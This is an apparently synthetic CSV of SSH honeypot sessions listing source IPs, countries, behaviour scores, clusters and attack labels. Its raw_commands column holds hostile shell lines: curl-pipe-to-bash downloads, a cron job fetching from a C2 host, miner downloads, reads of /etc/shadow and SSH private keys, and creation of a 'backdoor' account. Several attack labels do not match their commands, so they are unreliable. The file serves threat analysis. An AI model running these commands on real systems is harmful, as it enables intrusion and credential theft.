session_id,src_ip,country,login_attempts,login_success,num_commands,session_duration,dst_port,recon_score,persistence_score,mining_score,lateral_score,exfil_score,has_download,has_chmod,has_cron,has_useradd,raw_commands,cluster,attack_type
f02b499c9caa40bf,159.89.49.114,United States,1,0,0,2,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8488779712944309,211.94.20.175,China,5,1,3,27,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
6ade2e1b6fe94b19,68.183.39.102,United States,5,1,3,26,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
8ac2079061af41a3,91.240.118.172,Ukraine,2,1,2,17,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
0b9e152c561548b5,218.92.0.158,China,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
513b1fe923b240cf,92.255.57.210,Russia,2,1,3,19,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
2bcfd10de3a244df,167.71.13.196,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ff885934e2544f8f,5.188.86.172,Russia,2,1,3,17,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
cf1491ff7dcf45f7,134.209.82.19,United States,5,1,5,35,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
cb630289cabf4b09,80.82.77.139,Netherlands,4,1,3,25,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
7b6b5049fcdd4c47,91.240.118.172,Ukraine,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
53aaf0ec395b4f78,193.32.162.8,Russia,5,1,2,22,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
2e8c62820e2d4ce6,206.189.32.177,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8c1fe911eeba42b8,218.92.0.158,China,3,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
6566a47da1754641,104.236.198.48,United States,2,1,2,24,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
c7110b98b2e74153,218.92.0.158,China,5,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5957c1d1fb864505,58.218.211.36,China,1,1,1,12,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
74c3cfbdc0194d76,68.183.39.102,United States,4,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e02f7eb40f244ab5,198.199.65.32,United States,2,1,2,14,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
ee5a4fe4e07b4975,5.188.86.172,Russia,5,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
1474113296584bec,45.142.212.100,Netherlands,4,1,5,26,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
26c784b787ff4d7a,179.60.150.100,Brazil,3,1,3,27,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
487d0a2af92343d6,164.92.98.77,United States,4,1,2,27,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
a151e051b9df4b1b,206.189.32.177,United States,3,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
d74a64d859b043ad,134.209.82.19,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
61db3f73b32341fe,193.32.162.8,Russia,4,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
c385c8a24c2449d7,138.197.148.152,United States,5,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
b30cd930639a4f51,206.189.32.177,United States,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
dbb3a85e3fb548cf,159.89.49.114,United States,4,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
333374451b03490f,193.32.162.8,Russia,3,1,2,16,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
ed432191fa4d4dd5,103.99.0.122,India,5,1,1,20,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
a0e8366ad78f4319,68.183.39.102,United States,1,1,3,14,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
7297985c512547ab,198.199.65.32,United States,2,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
a487154c5243478c,58.218.211.36,China,2,1,5,29,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
9df7496d198a4a7b,179.60.150.100,Brazil,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
f5c68d6f2a1740d3,222.186.15.101,China,1,1,2,13,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
e2446dd6a4344be6,164.92.98.77,United States,3,1,2,17,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
5598f4115f7444b6,138.197.148.152,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
018889d236674586,117.21.191.131,China,1,1,2,15,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
b3018f065889480e,134.209.82.19,United States,4,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
17b2417919c24293,194.165.16.11,Russia,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
51821b395add458b,134.209.82.19,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8a478cf868174c43,206.189.32.177,United States,1,1,1,6,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
847c6248ecaa4814,92.255.57.210,Russia,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ef8cbc0505574fc5,157.245.108.55,United States,5,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
4f4e03e1784b4414,104.236.198.48,United States,1,1,3,22,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
baa41527f04741cc,211.94.20.175,China,1,1,3,12,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
e4a8639cf9c74b07,80.82.77.139,Netherlands,4,1,5,45,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
0487e30357e246ea,179.60.150.100,Brazil,5,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
01e7949ef641473b,91.240.118.172,Ukraine,4,1,2,19,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
f1b96586b8af4e72,211.94.20.175,China,4,1,1,26,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
78d2c74c51fc4170,206.189.32.177,United States,2,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
0f4cc75365c5418e,185.220.101.45,Germany,3,1,5,34,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
3307ef93e00345df,45.142.212.100,Netherlands,2,1,3,15,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
b2607ea336ab4ea3,167.71.13.196,United States,5,0,0,18,22,0,0,0,0,0,0,0,0,0,0,1,Recon
74f110a327914ee8,167.71.13.196,United States,5,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
912766bbbc624454,92.255.57.210,Russia,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c681be33c01a44e4,167.71.13.196,United States,4,1,1,22,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
e2b049fbeb4b4dad,211.94.20.175,China,1,1,2,14,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
eae6456fb01a4107,92.255.57.210,Russia,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e3191353880e4a9e,211.94.20.175,China,5,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
ba9a6f02a69a457b,157.245.108.55,United States,5,1,5,29,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
c1fa9b0701f74889,198.199.65.32,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e53e8ea5cdb54dc5,206.189.32.177,United States,3,1,3,28,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
6916f367af8a4b8a,178.128.21.44,Singapore,3,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
153c1d370b2b4eaa,117.21.191.131,China,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
09d80a2c7141428e,157.245.108.55,United States,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
df1413f97f8b4681,117.21.191.131,China,2,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
08fffaa5158d4759,198.199.65.32,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
3406787548834ebd,180.129.12.93,China,1,1,2,8,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
5559199f056346d0,167.71.13.196,United States,3,1,5,28,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
05caf312752e4545,185.220.101.45,Germany,3,1,5,32,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
45517c7178ef4ad4,179.60.150.100,Brazil,4,1,3,28,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
7cb0a4a014c64432,103.99.0.122,India,3,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
df2d7b864d6648a3,103.99.0.122,India,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
04a3a160fc114be0,5.188.86.172,Russia,3,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
e86c5816c18a4efc,134.209.82.19,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ab67d871dd7d45a2,138.197.148.152,United States,5,1,3,33,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
cde0aa493d59492a,179.60.150.100,Brazil,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
d10ca53e0fa84f90,179.60.150.100,Brazil,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
1bdb761b83214590,92.255.57.210,Russia,5,1,5,33,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
76fc4f1de2be4d32,179.60.150.100,Brazil,4,1,5,35,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
ada3b2a06ef54517,45.95.147.236,Netherlands,3,1,5,30,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
c579f4cf7bff423d,178.128.21.44,Singapore,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5671fd6bcbbd4ca7,222.186.15.101,China,4,1,2,18,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
3a17d49c1b1b4eb8,138.197.148.152,United States,3,1,1,13,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
0ae903df35d9449a,179.60.150.100,Brazil,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c7fd62fa79644fc1,159.89.49.114,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
90339c3dd4644db0,193.32.162.8,Russia,1,1,5,31,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
519258f815be4d55,179.60.150.100,Brazil,3,1,2,18,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
2d09b5ac409941d9,206.189.32.177,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5c4f4defb2bc4c50,164.92.98.77,United States,2,1,1,9,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
af2a0f7c151c4ac6,134.209.82.19,United States,1,1,1,5,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
c2aed1ad51324152,117.21.191.131,China,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
d1e6665dc32040d4,206.189.32.177,United States,3,1,3,27,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
3aee130fdcb84cbd,157.245.108.55,United States,5,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
14d1a908749040c4,164.92.98.77,United States,1,1,3,19,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
61d9ddd78d7e4621,179.60.150.100,Brazil,3,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
65e23bee21144d26,117.21.191.131,China,2,1,5,22,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
41df14acefbd42e0,218.92.0.158,China,3,1,2,20,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
0035097c53b848f3,193.32.162.8,Russia,5,1,2,19,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
080d6f44ac154fa5,206.189.32.177,United States,5,1,1,14,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
dce0d1534b884b40,117.21.191.131,China,5,1,5,45,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
0016ab51560c440d,117.21.191.131,China,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
01f8abbdbaad4726,222.186.15.101,China,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
966c075b3ffa48c8,194.165.16.11,Russia,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
9fcd2a4a27634989,117.21.191.131,China,1,1,2,19,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
c6f4a10b9a864566,80.82.77.139,Netherlands,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
911aed12d14c4323,180.129.12.93,China,4,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
aa12a3b7a9a84805,5.188.86.172,Russia,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
b7ef840dedef4693,194.165.16.11,Russia,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
304821c11ba044d3,138.197.148.152,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ec7f878c6f664902,58.218.211.36,China,5,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a09d1998cdb14612,164.92.98.77,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c1b88c6da82b4aad,68.183.39.102,United States,5,1,3,25,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
656e8c28edca440e,138.197.148.152,United States,3,1,5,34,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
ba4a07e941394cad,159.89.49.114,United States,1,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
1d2101a1b0d64e7a,91.240.118.172,Ukraine,2,1,2,16,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
cd6f187866274549,178.128.21.44,Singapore,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c0490800bcf94465,117.21.191.131,China,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a1eeeab958ed4df4,91.240.118.172,Ukraine,5,1,3,22,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
244f667e609f41a5,45.142.212.100,Netherlands,2,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a8d59116af3e4eb3,103.99.0.122,India,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
2f0b5e189fb54ca4,68.183.39.102,United States,3,1,5,25,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
6143bca29125421a,138.197.148.152,United States,3,1,1,9,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
